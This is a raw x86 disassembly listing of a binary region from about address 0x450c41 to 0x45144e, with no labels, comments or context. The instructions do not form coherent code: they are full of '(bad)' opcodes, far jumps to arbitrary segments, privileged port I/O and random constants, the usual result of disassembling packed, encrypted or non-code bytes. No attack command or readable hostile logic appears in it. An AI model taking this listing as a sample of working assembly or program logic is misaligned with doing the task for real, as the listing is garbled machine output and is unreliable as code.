  450c41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450c43:	dec    esi
  450c44:	xchg   edx,eax
  450c45:	xor    DWORD PTR [ebx],ebp
  450c47:	jmp    0xa206:0x768f1a08
  450c4e:	ja     0x450c60
  450c50:	popf   
  450c51:	mov    ebx,0x9e5594f0
  450c56:	jns    0x450c4a
  450c58:	xchg   esp,eax
  450c59:	pop    edi
  450c5a:	std    
  450c5b:	lds    ebx,FWORD PTR ds:0x60422b79
  450c61:	mov    edi,0x5d6d3f5
  450c66:	pop    ebp
  450c67:	(bad)  
  450c68:	adc    eax,0x250d2c8e
  450c6d:	pop    edi
  450c6e:	leave  
  450c6f:	mov    DWORD PTR [ebx+0x23],ebp
  450c72:	xchg   esp,eax
  450c73:	xchg   esp,eax
  450c74:	cmovns edi,DWORD PTR [edi-0x122a4e7c]
  450c7b:	pop    edx
  450c7c:	mov    ch,0xa6
  450c7e:	sbb    edx,DWORD PTR [ecx-0x156dd805]
  450c84:	test   DWORD PTR cs:[edx-0x62],0x54b361f6
  450c8c:	rol    DWORD PTR [ebp+0x2b],1
  450c8f:	fcom   DWORD PTR [ebp-0x28143fcf]
  450c95:	neg    bh
  450c97:	out    0xf,eax
  450c99:	pop    edx
  450c9a:	add    eax,0xbb52a22
  450c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450ca0:	mov    al,0xd2
  450ca2:	sti    
  450ca3:	dec    edx
  450ca4:	inc    edi
  450ca5:	lahf   
  450ca6:	sti    
  450ca7:	xchg   ebx,eax
  450ca8:	jg     0x450c6e
  450caa:	in     eax,0xeb
  450cac:	les    esp,FWORD PTR [ebx+0xcbfdfbf]
  450cb2:	mov    ch,0xa4
  450cb4:	add    ecx,DWORD PTR [esi+0x7826a0c9]
  450cba:	outs   dx,BYTE PTR ds:[esi]
  450cbb:	mov    ds:0x66aac91e,eax
  450cc0:	push   edi
  450cc1:	loope  0x450c61
  450cc3:	xor    al,BYTE PTR [edx-0x48bb4f1f]
  450cc9:	mov    ds:0x4585aab8,al
  450cce:	hlt    
  450ccf:	repnz mov al,0xd8
  450cd2:	inc    ecx
  450cd3:	bound  ecx,QWORD PTR [eax+0x4e10c059]
  450cd9:	sub    dh,dh
  450cdb:	jo     0x450cba
  450cdd:	xlat   BYTE PTR ds:[ebx]
  450cde:	mov    ah,0x52
  450ce0:	adc    eax,0x9ed8206
  450ce5:	vpsubusw xmm5{k7},xmm3,DWORD PTR [esi+0x50]{1to4}
  450cec:	test   BYTE PTR [ebx+ebx*8-0x3a],al
  450cf0:	and    DWORD PTR [edi-0x56959c45],ebp
  450cf6:	pop    ds
  450cf7:	cwde   
  450cf8:	pushf  
  450cf9:	mov    eax,ds:0x4b0f792d
  450cfe:	pop    edi
  450cff:	mov    ebx,DWORD PTR [edx]
  450d01:	jge    0x450c91
  450d03:	push   0x6c6a6257
  450d08:	mov    ch,0x70
  450d0a:	mov    cl,0xe9
  450d0c:	hlt    
  450d0d:	jmp    0xda59f2d9
  450d12:	lods   al,BYTE PTR ds:[esi]
  450d13:	jle    0x450d15
  450d15:	mov    ds:0x9cfc23a7,al
  450d1a:	ror    BYTE PTR [ebx+0x66],cl
  450d1d:	mov    ecx,0xa55c5931
  450d22:	inc    eax
  450d23:	fsub   DWORD PTR [esi]
  450d25:	cs (bad) 
  450d27:	out    dx,eax
  450d28:	mov    ebx,0xdcb4b318
  450d2d:	sub    esi,edx
  450d2f:	mov    ebx,0xf09a1e85
  450d34:	mov    ebx,0x163c5e11
  450d39:	jmp    0x74f83f7
  450d3e:	repnz mov esp,0x419c0d06
  450d44:	scas   al,BYTE PTR es:[edi]
  450d45:	and    DWORD PTR [ecx-0xc622adc],ebx
  450d4b:	out    dx,al
  450d4c:	sbb    al,0x99
  450d4e:	pusha  
  450d4f:	push   0xd8ba0508
  450d54:	xchg   ebx,eax
  450d55:	push   ss
  450d56:	pop    esp
  450d57:	and    DWORD PTR [ebp-0x542375da],eax
  450d5d:	xchg   edx,eax
  450d5e:	push   ss
  450d5f:	out    0x89,eax
  450d61:	sbb    DWORD PTR ds:0x744cba59,esp
  450d67:	mov    ds:0xffb8f065,eax
  450d6c:	test   BYTE PTR [ecx-0x65],0x80
  450d70:	sbb    ebx,DWORD PTR [ecx]
  450d72:	test   BYTE PTR [edi+0x6d],bh
  450d75:	xor    eax,0x75a62745
  450d7a:	mov    ecx,0x8983cff4
  450d7f:	(bad)  [ebp+0x13]
  450d82:	fs jmp 0x450d87
  450d85:	inc    edx
  450d86:	push   edi
  450d87:	in     al,0x1e
  450d89:	sbb    DWORD PTR [edx],ebp
  450d8b:	ror    BYTE PTR [ecx],0x34
  450d8e:	lock mov al,ds:0x477bc95a
  450d94:	mov    ebp,0x1ef2c520
  450d99:	jae    0x450dee
  450d9b:	adc    ebp,edi
  450d9d:	dec    edx
  450d9e:	sbb    cl,ch
  450da0:	sbb    BYTE PTR [ecx-0x768ecd86],ch
  450da6:	(bad)  
  450da7:	(bad)  
  450da8:	xchg   edi,eax
  450da9:	jbe    0x450ddf
  450dab:	and    BYTE PTR [edi-0x5e],dh
  450dae:	rcl    edx,cl
  450db0:	xchg   edx,eax
  450db1:	dec    edx
  450db2:	sbb    bl,BYTE PTR [ebx]
  450db4:	pop    ebx
  450db5:	leave  
  450db6:	test   al,0x41
  450db8:	and    DWORD PTR fs:[edi],eax
  450dbb:	push   eax
  450dbc:	inc    esp
  450dbd:	dec    edx
  450dbe:	mov    edi,0x9e05f50c
  450dc3:	jmp    0x450dc7
  450dc5:	test   al,0xde
  450dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450dc8:	inc    eax
  450dc9:	or     DWORD PTR [ebp-0x13],edi
  450dcc:	outs   dx,BYTE PTR ds:[esi]
  450dcd:	mov    cl,0xa5
  450dcf:	add    BYTE PTR [ebx+0x6a],ah
  450dd2:	call   0x24ee:0x1f0f35e7
  450dd9:	loope  0x450de2
  450ddb:	inc    eax
  450ddc:	popf   
  450ddd:	jnp    0x450e1e
  450ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450de0:	ret    
  450de1:	and    ch,dh
  450de3:	push   esi
  450de4:	ret    0x899b
  450de7:	mov    BYTE PTR [esi],al
  450de9:	(bad)  
  450dea:	aam    0xa0
  450dec:	pop    es
  450ded:	mov    ecx,0xa880d59d
  450df2:	retf   
  450df3:	mov    bl,0xb0
  450df5:	test   BYTE PTR [esi],al
  450df7:	or     BYTE PTR [ecx],ah
  450df9:	cdq    
  450dfa:	addr16 push cs
  450dfc:	or     esp,DWORD PTR [ebp-0x2e4359e4]
  450e02:	dec    ebx
  450e03:	data16 stc 
  450e05:	jmp    0x450de9
  450e07:	fistp  DWORD PTR [edx]
  450e09:	rcr    DWORD PTR [ebx+0x460924ba],1
  450e0f:	adc    DWORD PTR ds:0xa7766128,ebx
  450e15:	mov    eax,ds:0x5571bb2b
  450e1a:	fsubr  DWORD PTR ds:0xf0abf4f0
  450e20:	lea    ebx,[eax]
  450e22:	mov    ah,0x4
  450e24:	adc    edi,ebx
  450e26:	xchg   BYTE PTR [ebp-0x5a],ch
  450e29:	jle    0x450db9
  450e2b:	sbb    ah,ah
  450e2d:	mov    al,0xf9
  450e2f:	cmp    eax,0xe13e365c
  450e34:	xor    dh,bl
  450e36:	mov    ebx,0x28f437d4
  450e3b:	(bad)  
  450e3c:	mov    ch,0xcd
  450e3e:	and    al,0xf0
  450e40:	mov    eax,0x1e59e95e
  450e45:	sub    DWORD PTR [eax+0x29e97a5b],edi
  450e4b:	jg     0x450e01
  450e4d:	mov    ds:0x27847e3b,eax
  450e52:	push   ss
  450e53:	mov    eax,ds:0x1677ead3
  450e58:	sti    
  450e59:	je     0x450e1a
  450e5b:	test   BYTE PTR [edi-0x34759171],dh
  450e61:	adc    DWORD PTR ds:0x9f6c5a6,0xffffffec
  450e68:	mov    ebx,0xadee8c76
  450e6d:	jl     0x450ee5
  450e6f:	xchg   edx,eax
  450e70:	and    eax,0x51ec166d
  450e75:	mov    ebx,0xf9a43224
  450e7a:	cmp    eax,0x2b9e620e
  450e7f:	push   0x8c075081
  450e84:	sbb    BYTE PTR [ecx-0x25],bh
  450e87:	xchg   ebp,eax
  450e88:	ss cmp al,0x90
  450e8b:	pop    ds
  450e8c:	in     al,dx
  450e8d:	mov    eax,ds:0x1adbf81b
  450e92:	(bad)  
  450e93:	fsub   QWORD PTR [ebx+0x42]
  450e96:	out    0xa7,al
  450e98:	and    BYTE PTR [ecx+0x2913445d],cl
  450e9e:	pop    eax
  450e9f:	mov    ch,0xa5
  450ea1:	mov    cl,0xcb
  450ea3:	popa   
  450ea4:	push   0x8bfe21af
  450ea9:	fucomip st,st(2)
  450eab:	push   ebp
  450eac:	and    eax,0x17d10ec9
  450eb1:	repz push esp
  450eb3:	xlat   BYTE PTR ds:[ebx]
  450eb4:	test   BYTE PTR [ecx-0x3ee18f11],cl
  450eba:	ret    0x8ff4
  450ebd:	int3   
  450ebe:	sub    ecx,esp
  450ec0:	sbb    ch,BYTE PTR [ecx-0x51eec7cb]
  450ec6:	push   ds
  450ec7:	out    0x5,al
  450ec9:	int    0x1b
  450ecb:	cli    
  450ecc:	cmp    edx,edi
  450ece:	push   edi
  450ecf:	pop    ebx
  450ed0:	and    DWORD PTR [ecx+0x36],ebx
  450ed3:	lods   al,BYTE PTR ds:[esi]
  450ed4:	int    0x7e
  450ed6:	xor    DWORD PTR [ecx],ebx
  450ed8:	in     eax,0x9a
  450eda:	dec    ebx
  450edb:	sub    BYTE PTR [edi],ah
  450edd:	lock inc esp
  450edf:	and    BYTE PTR [esp+eiz*2+0x10],ch
  450ee3:	loopne 0x450f48
  450ee5:	test   eax,0xc74574bc
  450eea:	ror    bh,1
  450eec:	popaw  
  450eee:	fbld   TBYTE PTR [ecx-0x3]
  450ef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450ef2:	cld    
  450ef3:	xchg   BYTE PTR [ebx+ebx*4-0x728e0d51],bl
  450efa:	je     0x450ec4
  450efc:	mov    ah,BYTE PTR [ebx+0x5416e33f]
  450f02:	sbb    eax,0x5fc287ed
  450f07:	scas   eax,DWORD PTR es:[edi]
  450f08:	popa   
  450f09:	imul   eax,edx,0xf5f0aee
  450f0f:	ins    DWORD PTR es:[edi],dx
  450f10:	into   
  450f11:	add    eax,0x7557b4be
  450f16:	push   ebp
  450f17:	xor    al,0xc5
  450f19:	outs   dx,DWORD PTR ds:[esi]
  450f1a:	lods   al,BYTE PTR ds:[esi]
  450f1b:	repnz pop eax
  450f1d:	xor    BYTE PTR [di+0x292b],cl
  450f22:	mov    ah,0xaf
  450f24:	adc    al,0x6b
  450f26:	push   0xc99fd035
  450f2b:	inc    BYTE PTR [edi-0x344dfd7]
  450f31:	jmp    0x4fbf:0x1765cda2
  450f38:	cmc    
  450f39:	lods   al,BYTE PTR ds:[esi]
  450f3a:	shl    dl,0xf
  450f3d:	arpl   si,sp
  450f3f:	data16 sbb cl,bl
  450f42:	icebp  
  450f43:	adc    ebx,DWORD PTR [esi+ebx*2+0x4646555e]
  450f4a:	push   0x16
  450f4c:	cmc    
  450f4d:	test   DWORD PTR [edx],0x245560ee
  450f53:	lods   al,BYTE PTR ds:[esi]
  450f54:	pop    es
  450f55:	jnp    0x450f7d
  450f57:	aaa    
  450f58:	sbb    bh,cl
  450f5a:	mov    dh,BYTE PTR [eax-0x71b9fc59]
  450f60:	push   ebp
  450f61:	pop    esi
  450f62:	(bad)  
  450f63:	in     al,dx
  450f64:	icebp  
  450f65:	jl     0x450efb
  450f67:	test   eax,0xd62df92e
  450f6c:	cmp    bl,BYTE PTR [edi]
  450f6e:	dec    ecx
  450f6f:	inc    ebx
  450f70:	pop    ds
  450f71:	mov    edi,ebp
  450f73:	shl    BYTE PTR [edx+ebx*4+0x5b],cl
  450f77:	retf   
  450f78:	mov    edi,0x3b3a5514
  450f7d:	neg    DWORD PTR [edx+0x3e]
  450f80:	or     cl,BYTE PTR [ebp+0x6830d4b2]
  450f86:	hlt    
  450f87:	sbb    al,0x47
  450f89:	dec    ebp
  450f8a:	mov    ah,0xe0
  450f8c:	push   ds
  450f8d:	add    al,0x7e
  450f8f:	fcmovnu st,st(4)
  450f91:	cmp    eax,eax
  450f93:	js     0x450f28
  450f95:	mov    eax,ds:0xd8771ab2
  450f9a:	dec    eax
  450f9b:	cmp    al,0x94
  450f9d:	dec    eax
  450f9e:	mov    dl,0x34
  450fa0:	jle    0x451017
  450fa2:	js     0x450fd2
  450fa4:	xchg   esi,eax
  450fa5:	(bad)  
  450fa6:	mov    esp,0x25d923cd
  450fab:	cmp    ecx,esi
  450fad:	push   edx
  450fae:	sahf   
  450faf:	inc    esi
  450fb0:	es inc esi
  450fb2:	mov    edi,0xe3f8e3a4
  450fb7:	icebp  
  450fb8:	gs dec esi
  450fba:	or     ebp,eax
  450fbc:	jmp    0x450fea
  450fbe:	inc    esi
  450fbf:	or     ecx,DWORD PTR [ebp+0x2f5deed9]
  450fc5:	adc    dh,BYTE PTR [ecx+eiz*8-0xc5aeed5]
  450fcc:	sti    
  450fcd:	xchg   edx,eax
  450fce:	dec    esp
  450fcf:	(bad)  
  450fd0:	rol    DWORD PTR [ebx+0xa25503b],1
  450fd6:	jmp    0x17f792c4
  450fdb:	(bad)  
  450fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450fdd:	adc    eax,0xa1dd74b2
  450fe2:	mov    ds:0xc335b52a,al
  450fe7:	icebp  
  450fe8:	mov    dl,0xa8
  450fea:	fldcw  WORD PTR [edi+0x2353802f]
  450ff0:	mov    ah,al
  450ff2:	mov    ch,0x44
  450ff4:	fld    st(7)
  450ff6:	dec    esp
  450ff7:	aas    
  450ff8:	jne    0x451022
  450ffa:	fucomp st(3)
  450ffc:	pop    ebp
  450ffd:	or     DWORD PTR [eax],esi
  450fff:	(bad)  
  451000:	pop    ss
  451001:	sub    edi,esp
  451003:	popa   
  451004:	mov    edx,0xc5d701c5
  451009:	sahf   
  45100a:	pop    ebx
  45100b:	ja     0x450ff5
  45100d:	pop    ebp
  45100e:	ja     0x45103f
  451010:	test   eax,0x29e0989d
  451015:	sbb    DWORD PTR [ebp+0x3],ebx
  451018:	and    DWORD PTR [edi+0x6c],0x5e03365
  45101f:	repz inc eax
  451021:	adc    eax,0x522532b3
  451026:	iret   
  451027:	jmp    0xfa3517b8
  45102c:	gs aaa 
  45102e:	cwde   
  45102f:	and    BYTE PTR [esi-0x2a1b4a21],ch
  451035:	adc    al,0x4b
  451037:	cdq    
  451038:	(bad)  
  451039:	push   cs
  45103a:	call   DWORD PTR [edi]
  45103c:	stc    
  45103d:	cmp    eax,0x5bafd8d
  451042:	xor    al,bl
  451044:	(bad)  
  451045:	and    DWORD PTR [eax+0x663280f4],esi
  45104b:	scas   eax,DWORD PTR es:[edi]
  45104c:	or     edx,ebx
  45104e:	and    dh,BYTE PTR [eax-0x6]
  451051:	or     al,0xbf
  451053:	sub    al,0x11
  451055:	nop
  451056:	cmp    DWORD PTR ds:0xda7c1168,esp
  45105c:	xor    bl,BYTE PTR [eax]
  45105e:	push   edi
  45105f:	(bad)  
  451060:	mov    al,ds:0x5556bc8c
  451065:	add    ecx,ebx
  451067:	in     al,dx
  451068:	and    BYTE PTR [esi-0x6f],cl
  45106b:	sbb    ah,BYTE PTR ds:0xc4114679
  451071:	mov    edi,0x9ef1a46f
  451076:	mov    ebx,0x69158fa6
  45107b:	int    0x1f
  45107d:	data16 fwait
  45107f:	cmp    DWORD PTR [ecx-0xfcb4283],0x35f54347
  451089:	push   0x9eed265e
  45108e:	mov    edi,DWORD PTR [esi]
  451090:	sbb    DWORD PTR [edx],eax
  451092:	nop
  451093:	jnp    0x4510b6
  451095:	test   eax,0xbadeb9f8
  45109a:	das    
  45109b:	mov    esi,DWORD PTR [edi+0x1f3d0f39]
  4510a1:	jno    0x451061
  4510a3:	stos   DWORD PTR es:[edi],eax
  4510a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4510a5:	into   
  4510a6:	mov    bl,0x58
  4510a8:	stc    
  4510a9:	sub    bh,BYTE PTR [ebp+0x69]
  4510ac:	and    al,0xf1
  4510ae:	dec    ebp
  4510af:	ror    esp,cl
  4510b1:	js     0x4510bb
  4510b3:	leave  
  4510b4:	test   edi,edi
  4510b6:	and    al,0xec
  4510b8:	dec    ebx
  4510b9:	in     al,0xe0
  4510bb:	test   DWORD PTR [eax+0x5b],edi
  4510be:	or     eax,0xe2b91c83
  4510c3:	clc    
  4510c4:	imul   esp,esi,0x79
  4510c7:	stos   DWORD PTR es:[edi],eax
  4510c8:	sbb    BYTE PTR [ebx+ebp*1-0x39],ch
  4510cc:	mov    ch,0xae
  4510ce:	into   
  4510cf:	call   0xb3344e26
  4510d4:	or     BYTE PTR [edx+0x564914b6],al
  4510da:	inc    ecx
  4510db:	enter  0xa109,0x71
  4510df:	int3   
  4510e0:	sbb    al,0x71
  4510e2:	jle    0x451064
  4510e4:	mov    ecx,esi
  4510e6:	in     al,dx
  4510e7:	(bad)  
  4510e8:	fcmovnu st,st(4)
  4510ea:	sub    eax,0xe71f35cc
  4510ef:	jmp    0x4e9a6bed
  4510f4:	xchg   ebp,eax
  4510f5:	mov    esi,0x7286eebb
  4510fa:	sub    DWORD PTR [eax+0x1b],edx
  4510fd:	sbb    eax,edx
  4510ff:	ss sbb al,0x47
  451102:	dec    edi
  451103:	inc    ebp
  451104:	aad    0x99
  451106:	retf   
  451107:	add    eax,0x647e01f5
  45110c:	xchg   esp,eax
  45110d:	rcr    DWORD PTR [eax+0x23],1
  451110:	minps  xmm3,XMMWORD PTR [edi-0x42b9d22d]
  451117:	repnz lods eax,DWORD PTR ds:[esi]
  451119:	jb     0x4510d0
  45111b:	orps   xmm1,xmm5
  45111e:	sbb    al,0x57
  451120:	or     ebx,DWORD PTR [edx-0x4a7d21fe]
  451126:	adc    esp,DWORD PTR [eax]
  451128:	xchg   BYTE PTR [edx],ch
  45112a:	mov    esi,0x6fadd0a4
  45112f:	ins    BYTE PTR es:[edi],dx
  451130:	push   es
  451131:	sar    BYTE PTR [eax+0x2d926521],1
  451137:	adc    BYTE PTR [ebp-0x40],0xb2
  45113b:	add    al,0xe3
  45113d:	mov    cl,0xf5
  45113f:	js     0x451187
  451141:	sub    DWORD PTR [edi+0x675931d5],0xffffff93
  451148:	cli    
  451149:	daa    
  45114a:	jp     0x45111b
  45114c:	clc    
  45114d:	mov    ecx,0xa29a396a
  451152:	sbb    DWORD PTR [ecx+0x355fdb31],ecx
  451158:	adc    eax,0x92eb81a8
  45115d:	cld    
  45115e:	test   DWORD PTR [eax+0x1e],edi
  451161:	imul   eax,ebx,0xedd5d103
  451167:	push   esp
  451168:	xchg   esi,eax
  451169:	mov    ds:0xbe4a74fb,eax
  45116e:	into   
  45116f:	stos   DWORD PTR es:[edi],eax
  451170:	pop    es
  451171:	jns    0x4511a8
  451173:	and    bl,BYTE PTR [ebp-0x35]
  451176:	mov    esi,0x9a941554
  45117b:	xchg   esi,eax
  45117c:	xchg   esp,eax
  45117d:	cdq    
  45117e:	sti    
  45117f:	scas   eax,DWORD PTR es:[edi]
  451180:	xor    ecx,eax
  451182:	push   0xffffffc9
  451184:	push   ss
  451185:	popf   
  451186:	inc    esp
  451187:	sub    dh,dl
  451189:	add    dh,BYTE PTR [ebp+0x481edeb4]
  45118f:	sbb    ecx,ebp
  451191:	fwait
  451192:	dec    ebx
  451193:	adc    esi,0x0
  451196:	sub    DWORD PTR [ecx+0x46],ebx
  451199:	imul   ebx,esp,0x2be03f85
  45119f:	push   ebp
  4511a0:	pop    ss
  4511a1:	mov    dh,0xa0
  4511a3:	and    esi,edx
  4511a5:	call   0xc479:0xf749e61b
  4511ac:	mov    bh,0xf1
  4511ae:	out    dx,eax
  4511af:	ss and dh,bh
  4511b2:	lods   eax,DWORD PTR ds:[esi]
  4511b3:	out    0x99,al
  4511b5:	inc    eax
  4511b6:	and    BYTE PTR ds:0x132a4f17,ah
  4511bc:	mov    bl,0x64
  4511be:	pop    ds
  4511bf:	sub    eax,0x49d50986
  4511c4:	hlt    
  4511c5:	lahf   
  4511c6:	pop    esi
  4511c7:	push   edi
  4511c8:	dec    eax
  4511c9:	mov    bl,0x53
  4511cb:	fnstenv [edx]
  4511cd:	call   0xbfa8:0x123524b0
  4511d4:	or     DWORD PTR gs:[ebp+0x3efa67f3],esp
  4511db:	in     eax,dx
  4511dc:	xor    ecx,ebp
  4511de:	mov    al,0xec
  4511e0:	push   cs
  4511e1:	in     al,0xee
  4511e3:	(bad)  
  4511e4:	sbb    al,0x17
  4511e6:	and    al,0xbf
  4511e8:	ja     0x451257
  4511ea:	sti    
  4511eb:	scas   eax,DWORD PTR es:[edi]
  4511ec:	mov    eax,ds:0x40e4d1d3
  4511f1:	xchg   esp,eax
  4511f2:	push   ss
  4511f3:	mov    ch,0x1a
  4511f5:	and    eax,0xeb33ac4f
  4511fa:	lods   al,BYTE PTR ds:[esi]
  4511fb:	cli    
  4511fc:	scas   al,BYTE PTR es:[edi]
  4511fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4511fe:	mov    ebx,0xd38593ee
  451203:	xchg   ecx,eax
  451204:	aas    
  451205:	push   edx
  451206:	mov    bl,0x81
  451208:	rol    DWORD PTR [esi-0x4f],1
  45120b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  45120c:	imul   ecx,DWORD PTR [ebx+0x77531fa],0x4f7ce685
  451216:	sbb    BYTE PTR [esi+0x31],dh
  451219:	fstp   DWORD PTR [edx]
  45121b:	lea    ebp,[ecx+eax*1+0x7f]
  45121f:	and    ebx,DWORD PTR [edi-0x2fa22b8]
  451225:	cdq    
  451226:	loopne 0x451200
  451228:	and    edx,DWORD PTR [edi]
  45122a:	in     al,dx
  45122b:	cld    
  45122c:	and    al,0x3
  45122e:	push   cs
  45122f:	inc    esp
  451230:	xchg   edi,eax
  451231:	ss and al,0x1b
  451234:	lea    ebp,[edx-0x2b1b104e]
  45123a:	repz pushw ds
  45123d:	sub    BYTE PTR [eax-0x52689cec],bh
  451243:	iret   
  451244:	int    0x9f
  451246:	dec    ebx
  451247:	sub    DWORD PTR ss:[ebx-0x7a],ebp
  45124b:	add    esp,DWORD PTR [ecx+0x4a]
  45124e:	dec    eax
  45124f:	xor    al,0xf7
  451251:	mov    cl,0x32
  451253:	lods   al,BYTE PTR ds:[esi]
  451254:	sub    DWORD PTR [edi+0x472974b0],edi
  45125a:	lds    ebx,FWORD PTR [edi]
  45125c:	push   0xb5c5e1c4
  451261:	mov    ?,WORD PTR [eax]
  451263:	call   0x1ce1bde8
  451268:	enter  0xb10a,0x54
  45126c:	(bad)  
  45126d:	mov    bh,0xd3
  45126f:	out    0xa7,eax
  451271:	xor    ch,dl
  451273:	mov    esp,0xd73ba019
  451278:	or     DWORD PTR [ebp-0x2822e6a2],esp
  45127e:	or     edx,DWORD PTR [edi-0x38]
  451281:	ins    DWORD PTR es:[edi],dx
  451282:	mov    ch,0xc4
  451284:	and    ebp,DWORD PTR [edx+0x13]
  451287:	not    BYTE PTR [ebp+0x3f81b0f]
  45128d:	loope  0x45123e
  45128f:	test   BYTE PTR es:[edi+eiz*2+0x7c87eeae],dh
  451297:	jbe    0x451236
  451299:	xchg   ecx,eax
  45129a:	mov    esi,0x5b9edbfc
  45129f:	xchg   ebp,eax
  4512a0:	shl    BYTE PTR [ebx-0x6d7ba616],cl
  4512a6:	adc    ebp,DWORD PTR ds:0xadb32924
  4512ac:	cmp    bl,BYTE PTR [ebx-0x61c0067f]
  4512b2:	stos   DWORD PTR es:[edi],eax
  4512b3:	pop    ecx
  4512b4:	les    ebx,FWORD PTR [edi-0x7]
  4512b7:	jle    0x45130c
  4512b9:	push   0xffffffe9
  4512bb:	push   eax
  4512bd:	shl    BYTE PTR [ebx+0x45f79474],cl
  4512c3:	inc    edx
  4512c4:	cmc    
  4512c5:	repz sub edx,0x62
  4512c9:	cli    
  4512ca:	repz xlat BYTE PTR ds:[ebx]
  4512cc:	and    bh,BYTE PTR [ecx-0x71a5cb91]
  4512d2:	in     al,0x28
  4512d4:	sub    al,0x65
  4512d6:	ins    DWORD PTR es:[edi],dx
  4512d7:	inc    eax
  4512d8:	test   DWORD PTR [edi+0x1a3fdd67],esp
  4512de:	inc    ebx
  4512df:	test   al,0x1b
  4512e1:	jns    0x4512e8
  4512e3:	adc    bl,ch
  4512e5:	xor    DWORD PTR [eax-0x42],ecx
  4512e8:	bound  esp,QWORD PTR [edi-0x206269f5]
  4512ee:	cmc    
  4512ef:	call   0x91fc68b5
  4512f4:	dec    ebp
  4512f5:	lods   al,BYTE PTR ds:[esi]
  4512f6:	mov    cl,0xd4
  4512f8:	inc    esi
  4512f9:	lods   eax,DWORD PTR ds:[esi]
  4512fa:	fincstp 
  4512fc:	in     eax,0x61
  4512fe:	cld    
  4512ff:	repz or edx,DWORD PTR cs:[edx-0x8e628d8]
  451307:	cmp    eax,0x898c476a
  45130c:	xchg   esi,eax
  45130d:	add    DWORD PTR [edx+0x62],esi
  451310:	popf   
  451311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  451312:	jmp    0xc0d64fff
  451317:	pop    edx
  451318:	aaa    
  451319:	sub    BYTE PTR [esp+esi*2+0x5ece3006],bh
  451320:	idiv   DWORD PTR [eax+0x7f99c0fe]
  451326:	(bad)  
  451328:	pop    ecx
  451329:	mov    ecx,0x6fcd33c5
  45132e:	jae    0x451308
  451330:	pop    edi
  451331:	push   es
  451332:	mov    bl,0x34
  451334:	jmp    0x89fb:0xe6764d8a
  45133b:	push   ebp
  45133c:	add    BYTE PTR [ebp-0x11adb163],ah
  451342:	xor    ebp,edi
  451344:	jb     0x4513a6
  451346:	rol    esp,0xe5
  451349:	pop    ss
  45134a:	leave  
  45134b:	cmp    BYTE PTR [edi],bl
  45134d:	xor    DWORD PTR [edi],eax
  45134f:	dec    ecx
  451350:	mov    BYTE PTR [ebx],dl
  451352:	in     al,dx
  451353:	push   esp
  451354:	cli    
  451355:	call   0xf3c9:0xe0e55ee0
  45135c:	push   ebx
  45135d:	stc    
  45135e:	cmp    eax,0xdda70d66
  451363:	or     al,0x31
  451365:	sbb    esi,DWORD PTR [esi-0x68]
  451368:	int3   
  451369:	fwait
  45136a:	pop    edx
  45136b:	sub    al,0x85
  45136d:	dec    esi
  45136e:	mov    eax,ds:0x838e1ff4
  451373:	cmp    BYTE PTR [edi],dl
  451375:	sub    DWORD PTR [eax+0x5a],eax
  451378:	pusha  
  451379:	fmul   DWORD PTR [ebp-0x4590407]
  45137f:	cmp    esp,ebp
  451381:	test   ah,dl
  451383:	adc    edi,ebp
  451385:	vpmacssdd xmm4,xmm0,xmm0,XMMWORD PTR [esi-0x6dc2fb48]
  45138f:	inc    ebx
  451390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  451391:	pusha  
  451392:	cmp    DWORD PTR [ecx+eiz*8-0x2f],esp
  451396:	neg    DWORD PTR [edx+0x5977b496]
  45139c:	pop    ss
  45139d:	jmp    0xd7ff834a
  4513a2:	outs   dx,DWORD PTR ds:[esi]
  4513a3:	mov    edx,0xffcb99e2
  4513a8:	sub    al,dl
  4513aa:	push   0x60
  4513ac:	out    dx,eax
  4513ad:	sub    dh,BYTE PTR [ebp-0x4902bdc1]
  4513b3:	fs push 0x9619d3b7
  4513b9:	and    DWORD PTR [edi+0x7582825d],ecx
  4513bf:	nop
  4513c0:	adc    DWORD PTR [ebp-0x46],ebp
  4513c3:	test   BYTE PTR [edx],bl
  4513c5:	leave  
  4513c6:	jg     0x4513b1
  4513c8:	mov    BYTE PTR [eax],bh
  4513ca:	into   
  4513cb:	mov    ch,0x5f
  4513cd:	test   al,0xab
  4513cf:	in     eax,0xae
  4513d1:	mov    bh,BYTE PTR [ecx-0x7075b791]
  4513d7:	mov    BYTE PTR [ebx+0x9],cl
  4513da:	jmp    0x2971:0x19a91094
  4513e1:	arpl   WORD PTR [edi+0x66f12477],cx
  4513e7:	mov    bh,0x8b
  4513e9:	or     al,0x59
  4513eb:	scas   al,BYTE PTR es:[edi]
  4513ec:	xor    eax,0xc6807aa9
  4513f1:	leave  
  4513f2:	daa    
  4513f3:	cmp    DWORD PTR [esi+0x55cf8698],ebx
  4513f9:	fld    QWORD PTR ds:0x9e01afef
  4513ff:	dec    edx
  451400:	stc    
  451401:	fsub   QWORD PTR [ecx]
  451403:	and    bh,ch
  451405:	dec    eax
  451406:	or     dh,ah
  451408:	and    BYTE PTR [esi-0x5e3fa3af],dl
  45140e:	or     ebp,edi
  451410:	dec    esp
  451411:	pop    edi
  451412:	or     eax,0x815a21dc
  451417:	ret    0x3c88
  45141a:	mov    ecx,0x65695f24
  45141f:	jle    0x451499
  451421:	cwde   
  451422:	jmp    0xced2:0x56c456e6
  451429:	xchg   ecx,eax
  45142a:	mov    edi,0x270a4044
  45142f:	bound  edx,QWORD PTR [eax-0x62]
  451432:	cmp    ebp,esp
  451434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  451435:	dec    eax
  451436:	es push ebx
  451438:	retf   
  451439:	ret    0x4c74
  45143c:	xchg   esi,eax
  45143d:	in     al,dx
  45143e:	mov    ah,0x4
  451440:	int    0xf9
  451442:	jbe    0x45148b
  451444:	repz test BYTE PTR ss:[ecx],0x18
  451449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  45144a:	jae    0x4513ee
  45144c:	xor    al,0xc1
  45144e:	popa   
